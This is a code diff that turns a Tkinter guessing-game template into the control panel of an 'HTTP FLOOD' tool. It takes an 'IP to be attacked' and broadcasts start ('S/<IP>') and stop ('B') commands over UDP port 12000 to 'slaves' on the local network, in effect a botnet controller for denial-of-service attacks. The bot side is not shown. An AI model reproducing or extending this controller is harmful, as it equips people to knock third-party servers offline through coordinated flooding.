@@ -1,4 +1,6 @@
 from Tkinter import Tk, Label, Button, Entry, StringVar, DISABLED, NORMAL, END, W, E
+from socket import *
+from functools import partial
 import random
 
 def is_valid_ipv4(ip):
@@ -9,14 +11,20 @@ def is_valid_ipv4(ip):
                 and all(0 <= int(part) <= 255 for part in parts)
            )
 
-class GuessingGame:
+class Interface:
     def __init__(self, master):
+
+        serverPort = 12000
+        clientAddress = '255.255.255.255'
+        serverSocket = socket(AF_INET, SOCK_DGRAM)
+        serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        serverSocket.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
+        serverSocket.bind(('', serverPort))
+
         self.master = master
         master.title("HTTP FLOOD")
 
-
         self.IP = None
-
 
         self.message = "Type IP to be attacked:"
         self.label_text = StringVar()
@@ -26,8 +34,11 @@ class GuessingGame:
         vcmd = master.register(self.validate) # we have to wrap the command
         self.entry = Entry(master, validate="key", validatecommand=(vcmd, '%P'))
 
-        self.atack_button = Button(master, text="Start Atack", command=self.validate_IP)
-        self.stop_button = Button(master, text="Stop Atack", command=self.reset, state=DISABLED)
+        validate_ip_args = partial(self.validate_IP, serverSocket, clientAddress, serverPort)
+        self.atack_button = Button(master, text="Start Atack", command=validate_ip_args)
+
+        stop_attack_args = partial(self.stop_attack, serverSocket, clientAddress, serverPort)
+        self.stop_button = Button(master, text="Stop Atack", command=stop_attack_args, state=DISABLED)
 
         self.label.grid(row=0, column=0, columnspan=2, sticky=W+E)
         self.entry.grid(row=1, column=0, columnspan=2, sticky=W+E)
@@ -43,10 +54,11 @@ class GuessingGame:
             self.IP=IP
             return True
 
-    def validate_IP(self):
+    def validate_IP(self, serverSocket, clientAddress, serverPort):
 
         if (is_valid_ipv4(str(self.IP))):
             self.message = "Valid IP, Contacting Slaves!"
+            serverSocket.sendto("S/"+self.IP, (clientAddress, serverPort))
             self.atack_button.configure(state=DISABLED)
             self.stop_button.configure(state=NORMAL)
         else:
@@ -57,10 +69,11 @@ class GuessingGame:
 
         self.label_text.set(self.message)
 
-    def reset(self):
+    def stop_attack(self, serverSocket, clientAddress, serverPort):
         self.entry.delete(0, END)
 
         self.IP = None
+        serverSocket.sendto("B", (clientAddress, serverPort))
 
         self.message = "Type IP to be attacked:"
         self.label_text.set(self.message)
@@ -69,5 +82,5 @@ class GuessingGame:
         self.stop_button.configure(state=DISABLED)
 
 root = Tk()
-my_gui = GuessingGame(root)
+my_gui = Interface(root)
 root.mainloop()
